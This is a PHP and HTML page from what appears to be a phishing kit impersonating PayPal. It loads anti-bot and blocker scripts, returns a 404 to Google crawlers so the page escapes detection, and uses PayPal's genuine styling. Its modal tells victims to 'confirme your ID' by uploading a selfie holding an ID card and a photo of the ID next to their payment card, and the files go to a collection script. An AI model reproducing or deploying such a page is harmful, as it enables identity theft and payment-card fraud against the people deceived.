
<?php


session_start();
error_reporting(0);


include "../../../boots/antibots1.php";
include "../../../boots/antibots2.php";
include "../../../boots/antibots3.php";
include "../../../boots/antibots4.php";
include "../../../boots/encriptar.php";
include "../../../boots/.htaccess.htaccess";


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


session_start();

include("../../system/blocker.php");
include("../../system/detect.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);




?>


<link rel="stylesheet" href="../../css/main.css" data-reactid="10"/>


<div id="fixed"  class="vx_has-spinner-large spinner_fullScreen test_has_spinner" >



<!DOCTYPE html><html data-reactroot="" data-reactid="1" data-react-checksum="158555299"><head data-reactid="2"><script type="text/javascript" src="" data-reactid="3"></script><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" href="../lib/img/pp196.png" data-reactid="6"/><link rel="shortcut icon" type="image/x-icon" href="../lib/img/favicon.ico" data-reactid="7"/><link rel="icon" type="image/x-icon" href="../lib/img/pp32.png" data-reactid="8"/>



</div>


<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>





<script src="../lib/js/jquery.js"></script><script src="../lib/js/jquery.validate.js"></script><script src="../lib/js/jquery.v-form.js"></script>

<script src="../lib/js/jquery.mask.js"></script>


    <link rel="stylesheet" href="../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../lib/css/B-Z118.css">



<!DOCTYPE html><html data-reactroot="" data-reactid="1" data-react-checksum="158555299"><head data-reactid="2"><script type="text/javascript" src="https://www.paypalobjects.com/pa/js/min/pa.js" data-reactid="3"></script><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png" data-reactid="6"/><link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" data-reactid="7"/><link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png" data-reactid="8"/><link rel="stylesheet" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-0-5/paypal-sans.css" data-reactid="9"/><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/1f0/6dcd434cd566c97d0085ac711fbc4/css/main-service-nav.css" data-reactid="10"/><title data-reactid="11">PayPal: uploads card PayPaL</title></head><body class="vx_root vx_hasOpenModal vx_addFlowTransition" data-reactid="12"><div data-reactid="13"><script> var isLessthanIE10 = false; </script> <!--[if lte IE 10]> <script> isLessthanIE10 = true; </script> <![endif]--> <script> </script> <script async data-paypal-sitewide-search data-callback="onSearchLoad" src="https://www.paypal.com/search/js/embed.js"></script> 

</li></ul></div></div></div></div></div><div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader" data-reactid="104"><div class="vx_modal-wrapper" data-reactid="105"><a href="" name="modalClose" class="vx_modal-dismiss_x" data-reactid="106"><span class="vx_a11yText" data-reactid="107">close</span></a><div class="vx_modal-content" data-reactid="108">






<h2 class="vx_h2" data-reactid="110">Please confirme your ID for more secure</h2>

<div >
<div style="text-align: right;" trbidi="on">
<div style="text-align: center;">


<img src="../../img/sample-selfie-card.svg" style="height: 150px;">


<p id="Selfie">1.Selfie with your ID card</p>


<img src="../../img/sample-photo-id-card.svg" style="height: 150px;">

<p id="Selfie">2.Photo of your ID document (both sides for driver license or ID card) next to front side of your payment card.</p>
<p id="Selfie">(PDF - JPG - PNG)</p>

		<!-- Google Fonts -->
		<link href="css/css.css" rel="stylesheet">
		
		<!-- styles -->
		<link href="src/jquery.fileuploader.css" media="all" rel="stylesheet">
		<link href="css/jquery.fileuploader-theme-thumbnails.css" media="all" rel="stylesheet">
		
		<!-- js -->
		<script src="js/jquery-3.1.1.min.js" crossorigin="anonymous"></script>
		<script src="src/jquery.fileuploader.min.js" type="text/javascript"></script>
		<script src="./js/custom.js" type="text/javascript"></script>

	
	</head>

	<body>


	<form action="php/form_upload.php" method="post" enctype="multipart/form-data">






			<input type="file" name="files">
			



</div>

</div>

<input

class="vx_btn vx_btn-block"

value="Confirme and continue"

 type="submit">
		</form>

  <form action="../Thanks/" method="post" name="WorldWide_form" class="validatoa" novalidate="novalidate">



<input 
href=""
 type="submit" class="vx_btn vx_btn-secondary " 


value="No Thanks">

</form>

    </body>
</html>



</div><div></div><div>
</div></div><!-- react-empty: 119 -->
</div></div></div>
<div ></div><script type="text/javascript" src="" data-reactid="131"></script><script type="text/javascript" src="" data-reactid="132"></script><script type="text/javascript" src="" data-reactid="133"></script><script id="react-engine-props" type="application/json">



</html>
